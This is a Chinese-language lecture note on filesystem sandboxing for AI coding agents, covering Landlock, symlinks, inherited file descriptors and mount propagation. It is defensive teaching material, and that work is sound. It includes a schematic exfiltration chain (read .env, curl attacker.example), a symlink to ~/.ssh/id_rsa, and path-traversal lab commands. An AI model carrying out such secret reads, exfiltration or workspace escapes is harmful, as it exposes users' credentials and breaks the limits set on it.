# 第 9 讲：Filesystem Sandbox

## 1. cwd 为什么不等于 Sandbox

设置：

    cwd = /workspace/project

只代表：

> 程序启动后的当前目录。

它不会自动禁止：

    cat ../secret.txt
    cat /home/user/secret.txt

因此：

    cwd != filesystem isolation

## 2. 真正需要的是 Workspace Boundary

例如：

    /workspace/project
        READ
        WRITE
        EXECUTE

其他目录：

    DENY

这才是 AI Coding Agent 真正需要的 Workspace Sandbox。

## 3. symlink 为什么危险

假设：

    project/
      link -> /home/user/.ssh

程序访问：

    project/link/id_rsa

字符串看起来还在 project。

但最终对象已经跳到敏感目录。

因此安全策略必须考虑：

- canonical path；
- symlink；
- mount；
- hardlink；
- relative path；
- already-open file descriptors。

## 4. Linux 怎么做

常见组合：

    Mount Namespace
          ↓
    控制“看到哪些目录”

    Landlock
          ↓
    控制“对这些目录能做什么”

    /workspace
      READ
      WRITE
      EXECUTE

    /tmp
      READ
      WRITE

    credentials
      DENY

## 5. Landlock 的关键思想

Landlock 是 Linux Kernel 的 LSM sandbox 机制，可以由普通进程给自己增加额外限制。

它是：

> Additional restriction

而不是：

> Grant new privilege

也就是说：

    原本没有权限
       ↓
    Landlock
       ↓
    仍然没有权限

    原本有权限
       ↓
    Landlock
       ↓
    可以进一步限制

## 6. 为什么要限制“操作类型”

不是只有：

    read
    write

还可能有：

    execute
    remove
    create
    truncate
    rename / link
    device ioctl

AI Coding Workspace 通常需要：

    read
    write
    create
    remove

但未必需要：

    device access
    unrestricted namespace creation

## 7. Open FD 是高级问题

假设 Sandbox 前：

    fd = open("/secret.txt")

之后再进入 Sandbox。

如果这个 fd 继续被继承：

    Sandbox
      ↓
    inherited fd
      ↓
    secret.txt

那么路径规则可能已经来不及阻止。

因此 Sandbox Runtime 还要设计：

- inherited FD policy；
- close-on-exec；
- stdin/stdout/stderr；
- inherited sockets。

## 8. 文件系统隔离不能替代网络隔离

即使：

    workspace-only

如果 Agent 可以：

    read .env
      ↓
    curl attacker.example
      ↓
    exfiltrate

仍然有数据外传风险。

所以：

    Filesystem Isolation
           +
    Network Isolation

是现代 Agent Sandbox 的基础组合。

## 9. 实验

目录：

    sandbox-demo/
      workspace/
        hello.txt
      secret.txt

测试：

    cat workspace/hello.txt
    cat secret.txt
    cat workspace/../secret.txt

再创建：

    ln -s ../secret.txt workspace/link

    cat workspace/link

问题：

> 一个真正的 Sandbox 应该在哪里阻止它？

答案不是“发现 link 就拒绝”，而是应该在 OS policy 层让越界访问失败。

## 10. 面试题

### Q：为什么 cwd 不是 Sandbox？

因为它只设置工作目录，不限制绝对路径、相对路径、symlink 和 inherited FD。

### Q：Landlock 和 chmod 有什么区别？

chmod 是传统文件权限模型；Landlock 是额外的进程级限制层。

## 参考

Linux Landlock:
https://docs.kernel.org/userspace-api/landlock.html

## 11. Landlock 规则不是“自动拒绝一切未列出的行为”

Landlock ruleset 创建时必须明确声明哪些 access rights 由该 ruleset 接管（`handled_access_fs`）。一般来说，只有被标记为 handled 的访问类型，才会按照 Landlock 规则被拒绝或允许；没有被声明为 handled 的类型仍按其他传统权限检查处理。

有一个重要例外：`LANDLOCK_ACCESS_FS_REFER`（跨目录 reparent / link / rename）在未显式处理时也有默认拒绝行为；ABI v1 还会默认阻止跨目录 reparent。不要把“未列入 handled 就一定允许”当成普遍规则。

因此生产策略要：

1. 查询运行中 Kernel 的 Landlock ABI；
2. 按 ABI 能力构造 handled 权限；
3. 对每个允许访问的目录授予明确的权限；
4. 对不能覆盖的权限使用其他机制补齐；
5. 如果目标平台无法强制执行关键策略，应拒绝启动或明确降级，不要悄悄当作安全成功。

## 12. 已打开 FD 与路径授权不是同一个问题

Landlock 文件系统访问限制不会追溯作用于进入 Sandbox 前已经打开的文件 / 目录 FD。打开时获得的 FD 可能继续提供原先的访问能力；对于 `TRUNCATE` 和设备 `IOCTL`，相关权限也会与打开时创建的 FD 关联。FD 还可以通过 Unix socket 等机制传递给其他进程。

所以 Runtime 应在进入 Sandbox 前：

- 关闭不需要的文件描述符；
- 对必须保留的 stdin/stdout/stderr 做明确设计；
- 不要无条件继承 SSH Agent、Docker Socket、数据库 socket 等 FD；
- 使用 close-on-exec，并审查 FD passing / Unix socket；
- 不要把“路径策略已配置”理解成“进程手上没有任何越界能力”。

## 13. Hardlink、REFER 与 TOCTOU

路径规范化和 `realpath()` 检查不能单独防住所有文件系统竞态。文件可能在检查后、打开前被替换；硬链接也意味着不同路径可能指向同一个 inode。

在 Linux 上应结合 Landlock 的 `REFER` 权限、适当的路径解析约束（例如 `openat2` 的 resolve flags）和基于 FD 的操作设计。不要只用字符串前缀判断路径是否位于 workspace。

## 14. 线程同步与 no_new_privs

Landlock 默认通过 `landlock_restrict_self()` 限制调用线程及其后代。ABI v8 起可以通过 `LANDLOCK_RESTRICT_SELF_TSYNC` 把规则原子地同步应用到当前进程的所有线程。

无特权进程通常需要先设置 `PR_SET_NO_NEW_PRIVS` 才能 enforce Landlock；ABI v11 起也可以使用 `LANDLOCK_RESTRICT_SELF_NO_NEW_PRIVS`，由 `restrict_self` 在成功时设置该属性。具体调用应按运行中 ABI 和目标线程模型实现。


## 15. Landlock 不是完整的文件元数据审计 / 权限管理器

Kernel 文档明确列出一些 Landlock 目前不能单独限制的文件相关操作，例如：

- `chdir`、`stat` / `access`；
- `chmod` / `chown`；
- `flock`；
- `setxattr` / `utime`；
- 部分 `fcntl` 操作。

因此不要把“Landlock 已启用”描述成“所有文件系统相关 syscall 都已被限制”。对这些操作，应结合传统 DAC 权限、mount namespace、其他 LSM、丢弃不必要的 capability 和具体系统调用策略。

## 16. Bind Mount 与 OverlayFS 的规则传播不同

- **Bind mount**：源和目标是同一文件层次的不同挂载视图，Landlock 的层次限制可以沿 bind mount 传播。
- **OverlayFS**：lower、upper 和 merged 层在 Landlock 看来是独立的文件层次；限制某一层不会自动限制 merged 视图，反之亦然。

如果 Runtime 使用 OverlayFS / overlay writable layer，必须针对 Agent 实际访问的 merged hierarchy 建立规则，并单独核对 upper / lower 层是否暴露给进程。不能只给 lower 或 upper 路径加规则，就推断 merged workspace 也已被限制。

参考：https://docs.kernel.org/userspace-api/landlock.html
